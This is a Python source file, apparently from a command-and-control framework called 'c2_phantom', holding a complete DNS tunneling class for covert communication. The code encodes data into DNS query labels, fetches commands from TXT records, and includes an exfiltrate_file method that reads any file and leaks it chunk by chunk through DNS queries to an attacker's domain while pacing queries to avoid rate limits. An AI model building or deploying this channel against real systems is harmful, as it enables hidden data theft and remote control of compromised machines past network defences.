"""
DNS tunneling implementation for covert communication.

Provides DNS-based covert channel using TXT records for command injection.
"""

import base64
import asyncio
from typing import Optional, List
from datetime import datetime

import dns.resolver
import dns.message
import dns.query
from dns.exception import DNSException

from c2_phantom.core.exceptions import NetworkError


class DNSTunnel:
    """DNS tunneling for covert command & control."""

    def __init__(
        self,
        domain: str,
        dns_server: str = "8.8.8.8",
        timeout: int = 5,
        max_label_length: int = 63,
    ) -> None:
        """
        Initialize DNS tunnel.

        Args:
            domain: Base domain for tunneling
            dns_server: DNS server to query
            timeout: Query timeout in seconds
            max_label_length: Maximum DNS label length
        """
        self.domain = domain
        self.dns_server = dns_server
        self.timeout = timeout
        self.max_label_length = max_label_length
        self.resolver = dns.resolver.Resolver()
        self.resolver.nameservers = [dns_server]
        self.resolver.timeout = timeout
        self.resolver.lifetime = timeout

    def _encode_data(self, data: bytes) -> str:
        """
        Encode data for DNS transmission.

        Args:
            data: Raw data to encode

        Returns:
            Base32-encoded string suitable for DNS
        """
        # Use base32 for DNS-safe encoding
        encoded = base64.b32encode(data).decode().rstrip("=").lower()
        return encoded

    def _decode_data(self, encoded: str) -> bytes:
        """
        Decode data from DNS response.

        Args:
            encoded: Base32-encoded string

        Returns:
            Decoded bytes
        """
        # Add padding if needed
        padding = (8 - len(encoded) % 8) % 8
        encoded = encoded.upper() + "=" * padding
        return base64.b32decode(encoded)

    def _chunk_data(self, data: str) -> List[str]:
        """
        Split data into DNS-safe chunks.

        Args:
            data: Encoded data string

        Returns:
            List of data chunks
        """
        chunks = []
        for i in range(0, len(data), self.max_label_length):
            chunks.append(data[i : i + self.max_label_length])
        return chunks

    def _construct_query_domain(self, encoded_data: str, sequence: int = 0) -> str:
        """
        Construct DNS query domain.

        Args:
            encoded_data: Encoded data chunk
            sequence: Sequence number for reassembly

        Returns:
            Full query domain
        """
        return f"{sequence:04x}.{encoded_data}.{self.domain}"

    async def send_data(self, data: bytes) -> bool:
        """
        Send data through DNS tunnel.

        Args:
            data: Data to send

        Returns:
            True if successful

        Raises:
            NetworkError: If transmission fails
        """
        try:
            # Encode data
            encoded = self._encode_data(data)
            chunks = self._chunk_data(encoded)

            # Send each chunk
            for i, chunk in enumerate(chunks):
                query_domain = self._construct_query_domain(chunk, i)

                # Perform DNS query
                try:
                    await asyncio.get_event_loop().run_in_executor(None, self.resolver.resolve, query_domain, "A")
                except DNSException:
                    # DNS queries may fail, that's okay for covert channel
                    pass

            return True

        except Exception as e:
            raise NetworkError(f"DNS tunneling failed: {str(e)}")

    async def receive_data(self, query_id: str) -> Optional[bytes]:
        """
        Receive data through DNS TXT records.

        Args:
            query_id: Identifier for the data to retrieve

        Returns:
            Retrieved data or None

        Raises:
            NetworkError: If retrieval fails
        """
        try:
            query_domain = f"{query_id}.{self.domain}"

            # Query TXT records
            answers = await asyncio.get_event_loop().run_in_executor(None, self.resolver.resolve, query_domain, "TXT")

            # Extract and decode data from TXT records
            txt_data = []
            for rdata in answers:
                for txt_string in rdata.strings:
                    txt_data.append(txt_string.decode())

            if not txt_data:
                return None

            # Combine and decode
            combined = "".join(txt_data)
            return self._decode_data(combined)

        except dns.resolver.NXDOMAIN:
            return None
        except DNSException as e:
            raise NetworkError(f"DNS query failed: {str(e)}")
        except Exception as e:
            raise NetworkError(f"DNS tunneling failed: {str(e)}")

    async def send_command(self, command: str) -> bool:
        """
        Send command through DNS tunnel.

        Args:
            command: Command string to send

        Returns:
            True if successful
        """
        return await self.send_data(command.encode())

    async def exfiltrate_file(self, file_path: str, chunk_size: int = 32) -> bool:
        """
        Exfiltrate file through DNS tunnel.

        Args:
            file_path: Path to file to exfiltrate
            chunk_size: Chunk size in bytes

        Returns:
            True if successful

        Raises:
            NetworkError: If exfiltration fails
        """
        try:
            with open(file_path, "rb") as f:
                sequence = 0
                while True:
                    chunk = f.read(chunk_size)
                    if not chunk:
                        break

                    encoded = self._encode_data(chunk)
                    query_domain = self._construct_query_domain(encoded, sequence)

                    # Send DNS query
                    try:
                        await asyncio.get_event_loop().run_in_executor(None, self.resolver.resolve, query_domain, "A")
                    except DNSException:
                        pass

                    sequence += 1

                    # Small delay to avoid rate limiting
                    await asyncio.sleep(0.1)

            return True

        except FileNotFoundError:
            raise NetworkError(f"File not found: {file_path}")
        except Exception as e:
            raise NetworkError(f"File exfiltration failed: {str(e)}")

    def create_txt_record_data(self, data: bytes) -> str:
        """
        Create TXT record data for server-side use.

        Args:
            data: Data to encode in TXT record

        Returns:
            TXT record data string
        """
        return self._encode_data(data)

    async def health_check(self) -> bool:
        """
        Check if DNS tunnel is operational.

        Returns:
            True if operational
        """
        try:
            test_domain = f"health.{self.domain}"
            await asyncio.get_event_loop().run_in_executor(None, self.resolver.resolve, test_domain, "A")
            return True
        except Exception:
            return False
